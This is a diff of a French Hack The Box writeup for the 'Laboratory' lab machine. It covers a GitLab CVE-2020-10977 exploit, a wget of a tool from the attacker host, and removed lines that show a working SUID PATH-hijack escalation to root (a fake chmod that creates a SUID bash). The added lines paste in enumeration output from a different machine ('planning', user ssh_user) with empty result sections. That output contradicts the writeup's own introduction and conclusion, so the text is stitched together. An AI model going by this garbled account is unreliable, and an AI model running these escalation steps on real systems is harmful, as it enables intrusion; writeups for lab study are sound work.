@@ -13,9 +13,9 @@ draft: true
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "Summary générique de machine CTF"
-description: "Description générique de machine CTF"
-tags: ["Hack The Box","HTB Easy","linux-privesc"]
+summary: "Writeup Laboratory (HTB Easy) : GitLab vulnérable, extraction de clé SSH et escalade Linux via SUID et PATH Hijacking."
+description: "Writeup Laboratory (HTB Easy) : GitLab vulnérable, clé SSH exposée et escalade Linux via SUID et PATH Hijacking." 
+tags: ["Hack The Box","HTB Easy","linux-privesc","GitLab","CVE-2020-10977","RCE","SSH","SUID","PATH Hijacking"]
 categories: ["Mes writeups"]
 
 # Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
@@ -35,7 +35,7 @@ TocOpen: true
 # --- Cover / images (Page Bundle) ---
 cover:
   image: "image.png"
-  alt: "Laboratory"
+  alt: "Machine Laboratory HTB Easy exploitée via GitLab, extraction de clé SSH et escalade Linux par SUID et PATH Hijacking."
   caption: ""
   relative: true
   hidden: false
@@ -48,7 +48,7 @@ ctf:
   machine: "Laboratory"
   difficulty: "Easy"
   target_ip: "10.129.x.x"
-  skills: ["Enumeration","Web","Privilege Escalation"]
+  skills: ["Enumeration","Web","GitLab","RCE","SSH","Privilege Escalation"]
   time_spent: "2h"
   # vpn_ip: "10.10.14.xx"
   # notes: "Points d'attention…"
@@ -131,11 +131,13 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-- Contexte (source, thème, objectif).
-- Hypothèses initiales (services attendus, techno probable).
-- Objectifs : obtenir `user.txt` puis `root.txt`.
+La machine `Laboratory` de Hack The Box, classée HTB Easy, propose un walkthrough Linux centré sur une instance GitLab vulnérable, la découverte d’un vhost et une escalade de privilèges locale. Ce writeup détaille une chaîne d’exploitation complète, depuis l’identification du sous-domaine `git.laboratory.htb` jusqu’à l’obtention d’un shell root.
 
----
+La prise de pied repose sur GitLab, accessible via le vhost découvert pendant l’énumération web. Après l’exploitation de l’application, l’analyse des dépôts internes permet de retrouver des informations utiles et de pivoter vers l’utilisateur `dexter` en SSH.
+
+L’escalade de privilèges s’appuie ensuite sur l’analyse du binaire SUID `/usr/local/bin/docker-security`. Avec `strace`, tu observes que ce programme appelle `chmod` sans chemin absolu, ce qui permet un détournement du `PATH` et conduit à l’accès root.
+
+
 
 ## Énumération
 
@@ -395,19 +397,11 @@ Les répertoires `/images` et `/assets` peuvent être explorés, mais l’inform
 https://git.laboratory.htb
 ```
 
-### Accès à l’interface GitLab
+Avant de poursuivre l’exploitation, tu vérifies que l’interface GitLab répond correctement. Sur cette machine, GitLab peut parfois retourner une erreur `502`, notamment après un reset ou lorsque le service n’est pas encore complètement disponible.
 
-La première connexion à `https://git.laboratory.htb/` affiche un avertissement lié au certificat TLS.
+Tu utilises donc une petite boucle `curl` pour tester régulièrement la réponse de `https://git.laboratory.htb/`. La commande affiche le code HTTP, extrait le titre de la page lorsqu’il est présent, puis s’arrête dès que GitLab ne répond plus en `502` ou en `000`.
 
-Le certificat présenté par le serveur est auto-signé, ce qui est fréquent sur les machines Hack The Box. Dans ce contexte, tu peux accepter l’avertissement du navigateur afin d’accéder à l’interface Web.
 
-<img src="gitlab-accept-self-signed-certificate.png" alt="Avertissement du navigateur lié au certificat auto-signé de git.laboratory.htb" class="img-left-70">
-
-Une fois l’avertissement accepté, l’interface GitLab peut ne pas être immédiatement disponible. Sur cette machine, Hack The Box précise que le service GitLab peut prendre plusieurs minutes à démarrer complètement. Pendant ce délai, l’application peut retourner une erreur `502`.
-
-![Page GitLab affichant une erreur 502 pendant le démarrage du service GitLab sur Laboratory HTB](gitlab-502.png)
-
-Pour éviter de poursuivre trop tôt, tu peux vérifier régulièrement que l’application répond correctement avec une petite boucle `curl`. La commande affiche le code HTTP, extrait le titre de la page lorsqu’il est présent, puis s’arrête dès que GitLab ne répond plus en `502` ou en `000`.
 
 ```bash
 while true; do
@@ -427,7 +421,7 @@ done
 
 Hack The Box indique que le service GitLab peut prendre jusqu’à 5 minutes avant d’être pleinement disponible. Il est donc normal d’obtenir temporairement des erreurs `502` après un reset de la machine.
 
-
+![Page GitLab affichant une erreur 502 pendant le démarrage du service GitLab sur Laboratory HTB](gitlab-502.png)
 
 Voici par exemple une attente typique avant que GitLab réponde correctement :
 
@@ -454,7 +448,7 @@ Une fois GitLab disponible, tu peux ouvrir l’interface web sur `https://git.la
 
 Le certificat HTTPS étant auto-signé, le navigateur affiche d’abord un avertissement de sécurité. Pour poursuivre l’exploration de la machine, tu acceptes l’exception et tu accèdes à l’application.
 
-
+![Avertissement du navigateur lié au certificat auto-signé de git.laboratory.htb](gitlab-accept-self-signed-certificate.png)
 
 La page d’accueil de GitLab permet de créer un compte utilisateur. Tu utilises donc la fonctionnalité d’enregistrement proposée par l’application.
 
@@ -515,14 +509,6 @@ Sur Kali, tu clones le dépôt contenant le script d’exploitation :
 ```bash
 git clone https://github.com/vandycknick/gitlab-cve-2020-10977.git
 cd gitlab-cve-2020-10977.git
-```
-
-Tu vérifies ensuite que les dépendances Python nécessaires sont disponibles dans Kali. Le script indique avoir été testé avec **Python 3.9** et nécessite les modules `requests` et `beautifulsoup4`.
-
-Tu peux t'assurer de leur présence en te basant sur la recette {{< recette "installation-modules-python3-kali" >}}
-
-```bash
-pip3 install requests beautifulsoup4 --break-system-packages
 ```
 
 
@@ -588,7 +574,7 @@ Le message `Login Successfull!` confirme que les identifiants GitLab sont valide
 
 À ce stade, tu sais donc que l’exploit est fonctionnel. Tu peux maintenant passer à l’exécution d’une commande avec l’option `--cmd`.
 
-#### Validation de l’exécution d'une commande
+#### Validation de l’exécution de commande
 
 Avant de lancer un reverse shell, tu peux faire un test plus simple avec `wget`. L’idée est de demander à la cible de récupérer un fichier hébergé sur ta machine Kali. Si Kali reçoit la requête HTTP, cela confirme que la commande fournie à l’option `--cmd` est bien exécutée sur la cible.
 
@@ -869,12 +855,13 @@ Tu laisses ensuite `pspy64` tourner en arrière-plan pendant la suite de l’én
 
 Comme souvent lors d’une phase d’escalade de privilèges Linux, tu commences par vérifier les permissions sudo de l’utilisateur courant :
 
-```bash
-dexter@laboratory:~$ sudo -l
-[sudo] password for dexter:
+```
+ssh_user@planning:~$ sudo -l
+[sudo] password for ssh_user: 
+Sorry, user ssh_user may not run sudo on planning.
 ```
 
-Comme tu ne connais pas le mot de passe de `dexter`, cette piste ne permet pas d’avancer.
+L’utilisateur `ssh_user` ne possède donc aucun droit sudo exploitable.
 
 ### Exploration du contexte utilisateur
 
@@ -890,20 +877,42 @@ hostname
 
 Résultat :
 
-```bash
-dexter@laboratory:~$ whoami
-dexter
-dexter@laboratory:~$ id
-uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)
-dexter@laboratory:~$ pwd
-/home/dexter
-dexter@laboratory:~$ uname -a
-Linux laboratory 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
-dexter@laboratory:~$ hostname
-laboratory
+```
+ssh_user
+uid=1000(ssh_user) gid=1000(ssh_user) groups=1000(ssh_user)
+/home/ssh_user
+Linux planning 6.8.0-59-generic #61-Ubuntu SMP PREEMPT_DYNAMIC Fri Apr 11 23:16:11 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+planning
 ```
 
+Cette étape permet notamment de confirmer :
 
+- l’utilisateur courant
+- les groupes associés
+- le noyau Linux utilisé
+- le nom de la machine
+- le répertoire de travail actuel
+
+### Recherche de binaires SUID
+
+Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
+
+```
+find / -perm -4000 -type f 2>/dev/null
+```
+
+La liste obtenue ne contient que des binaires système classiques tels que :
+
+```
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/newgrp
+...
+```
+
+Ces résultats ne révèlent aucun binaire SUID inhabituel ni piste exploitable immédiate.
 
 ### Analyse des Linux capabilities
 
@@ -918,17 +927,14 @@ getcap -r / 2>/dev/null
 Résultat :
 
 ```
-/usr/bin/traceroute6.iputils = cap_net_raw+ep
-/usr/bin/ping = cap_net_raw+ep
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
 ```
 
-Les capabilities relevées concernent principalement des outils réseau classiques comme `ping`, `traceroute6.iputils` et `mtr-packet`.
+Ces résultats ne révèlent aucune capability inhabituelle ni piste exploitable immédiate.
 
-Cette vérification ne donne donc pas d’élément exploitable dans ce contexte.
-
-### Analyse des SUID avec suid3num.py
+### Analyse complémentaire avec suid3num.py
 
 Pour compléter l’analyse des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement :
 
@@ -943,176 +949,74 @@ wget http://10.10.x.x:8000/suid3num.py
 python3 suid3num.py
 ```
 
-Dans sa sortie, la section intéressante est la suivante :
+L’analyse confirme principalement la présence de binaires système classiques :
 
-```text
-[~] Custom SUID Binaries (Interesting Stuff)
-------------------------------
-/usr/local/bin/docker-security
-------------------------------
+```
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+...
 ```
 
-Cette information confirme que `/usr/local/bin/docker-security` n’est pas un binaire SUID standard du système, mais un programme personnalisé présent sur la machine. C’est donc lui qui mérite une analyse plus approfondie pour l’escalade de privilèges.
+L’outil confirme que :
 
-### Exploration de /usr/local/bin/docker-security
+- tous les binaires SUID présents sont standards
+- aucun binaire personnalisé n’est identifié
+- aucun binaire exploitable via GTFOBins n’est détecté
 
-Tu commences par identifier le fichier :
+Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.
 
-```bash
-file /usr/local/bin/docker-security
+### Inspection des tâches cron
+
+Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
+
+Les crons système peuvent être consultés avec :
+
 ```
-
-Résultat :
-
-```bash
-/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped
-```
-
-Le binaire est un ELF SUID 64 bits. `strings` aurait pu fournir rapidement des indices, mais l’outil n’est pas disponible sur la machine. 
-
-Pour comprendre ce que fait réellement `/usr/local/bin/docker-security`, tu passes donc à une analyse dynamique avec `strace`.
-
-Pour commencer, tu exécutes le binaire en enregistrant une trace complète dans un fichier temporaire :
-
-```bash
-strace -f -o /tmp/docker-security.strace /usr/local/bin/docker-security 2>/dev/null
-```
-
-L’option `-f` est importante, car le programme lance des processus enfants. Sans elle, tu ne verrais pas les commandes exécutées par ces sous-processus. L’option `-o` permet d’écrire la trace dans un fichier, ce qui rend l’analyse plus simple.
-
-Tu recherches ensuite les appels `execve`, qui correspondent aux programmes exécutés :
-
-```bash
-grep -n "execve" /tmp/docker-security.strace
-```
-
-La sortie montre que le binaire lance deux commandes `chmod` :
-
-```text
-execve("/bin/sh", ["sh", "-c", "chmod 700 /usr/bin/docker"], ...)
-execve("/bin/sh", ["sh", "-c", "chmod 660 /var/run/docker.sock"], ...)
-```
-
-Maintenant que tu sais que `chmod` est appelé, tu filtres la trace sur ce mot-clé :
-
-```bash
-grep -n "chmod" /tmp/docker-security.strace
-```
-
-```bash
-strace -f /usr/local/bin/docker-security 2>&1 | grep chmod
-```
-
-Cette fois, la sortie montre que le shell recherche `chmod` dans les répertoires du `PATH` :
-
-```text
-stat("/usr/local/sbin/chmod", ...) = -1 ENOENT (No such file or directory)
-stat("/usr/local/bin/chmod", ...) = -1 ENOENT (No such file or directory)
-stat("/usr/sbin/chmod", ...) = -1 ENOENT (No such file or directory)
-stat("/usr/bin/chmod", ...) = 0
-```
-
-Cette résolution via le `PATH` est la faiblesse exploitable. Comme `docker-security` est un binaire SUID appartenant à `root`, tu peux tenter de placer un faux `chmod` dans un répertoire contrôlé, puis modifier le `PATH` pour que ce faux `chmod` soit exécuté à la place de `/usr/bin/chmod`.
-
-### Exploitation avec un faux chmod
-
-L’analyse avec `strace` montre que `docker-security` appelle `chmod` sans chemin absolu. Comme le binaire est SUID root, tu peux tenter un détournement de `PATH`.
-
-L’idée est de créer un faux `chmod` dans un répertoire que tu contrôles. Ce faux `chmod` va copier `/bin/bash` vers `/tmp/rootbash`, puis lui ajouter le bit SUID.
-
-Tu te places dans `/dev/shm`, un répertoire temporaire dans lequel tu peux écrire :
-
-```bash
-cd /dev/shm
-```
-
-Tu crées ensuite le faux `chmod` :
-
-```bash
-cat > chmod << 'EOF'
-#!/bin/bash
-cp /bin/bash /tmp/rootbash
-/bin/chmod 4755 /tmp/rootbash
-EOF
-```
-
-Tu le rends exécutable :
-
-```bash
-chmod +x chmod
-```
-
-Tu modifies ensuite le `PATH` pour que `/dev/shm` soit consulté avant les répertoires système :
-
-```bash
-export PATH=/dev/shm:$PATH
-```
-
-Tu relances alors le binaire SUID :
-
-```bash
-/usr/local/bin/docker-security
-```
-
-Cette fois, lorsque `docker-security` appelle `chmod`, le shell trouve d’abord ton faux `chmod` dans `/dev/shm`. Le script est donc exécuté avec les privilèges du binaire SUID, ce qui crée `/tmp/rootbash` avec le bit SUID.
-
-Tu vérifies la présence du fichier :
-
-```bash
-ls -la /tmp/rootbash
-```
-
-Tu dois obtenir un binaire appartenant à `root` avec le bit SUID actif :
-
-```bash
--rwsr-xr-x 1 root root ... /tmp/rootbash
-```
-
-Tu peux maintenant lancer ce bash avec l’option `-p` pour conserver les privilèges effectifs :
-
-```bash
-/tmp/rootbash -p
-```
-
-Tu confirmes les privilèges :
-
-```bash
-id
+cat /etc/crontab
 ```
 
 Résultat :
 
-```bash
-uid=1000(dexter) gid=1000(dexter) euid=0(root) groups=1000(dexter)
+```
+17 * * * * root cd / && run-parts --report /etc/cron.hourly
+25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
 
-Le shell s’exécute avec un `euid=0` ce qui confirme que tu disposes maintenant des privilèges `root`.
+Aucune tâche personnalisée ni script modifiable par l’utilisateur `ssh_user` n’apparaît ici.
 
-### root.txt
+### Analyse des services locaux
 
-Tu peux maintenant lire le flag root.txt
+Tu vérifies ensuite les ports en écoute sur la machine afin d’identifier d’éventuels services accessibles uniquement depuis localhost.
 
 ```
-cat /root/root.txt
-3213xxxxxxxxxxxxxxxxxxxxxxxxxxx310d
+netstat -tulpn
 ```
 
-La lecture de `root.txt` confirme la compromission complète de la machine..
+Résultat :
+
+### Conclusion de l’énumération manuelle
+
+### Analyse avec linpeas.sh
+Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
+![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)
 
 ---
 
 ## Conclusion
 
-- Récapitulatif de la chaîne d'attaque (du scan à root).
-- Vulnérabilités exploitées & combinaisons.
-- Conseils de mitigation et détection.
-- Points d'apprentissage personnels.
+La machine `Laboratory` propose une progression cohérente depuis l’énumération initiale jusqu’à l’obtention de l’accès root. La découverte du sous-domaine `git.laboratory.htb` permet d’identifier une instance GitLab, puis de l’exploiter afin d’obtenir une première exécution de commandes sur la cible.
+
+À partir de cet accès, l’analyse des dépôts Git présents sur le serveur permet de récupérer des informations utiles et de pivoter vers l’utilisateur `dexter` via SSH. L’escalade de privilèges repose ensuite sur le binaire SUID `/usr/local/bin/docker-security`. Son observation avec `strace` montre qu’il appelle `chmod` sans chemin absolu, ce qui permet de détourner le `PATH` avec un faux binaire contrôlé.
+
+Cette machine illustre donc bien une chaîne d’exploitation classique en environnement Linux : énumération, prise de pied applicative, récupération d’identifiants, accès utilisateur, puis escalade locale grâce à une mauvaise gestion des chemins d’exécution.
 
 ---
 
-## Pièces jointes (optionnel)
 
-- Scripts, one-liners, captures, notes.  
-- Arbo conseillée : `files/<nom_ctf>/…`
 
 {{< feedback >}}
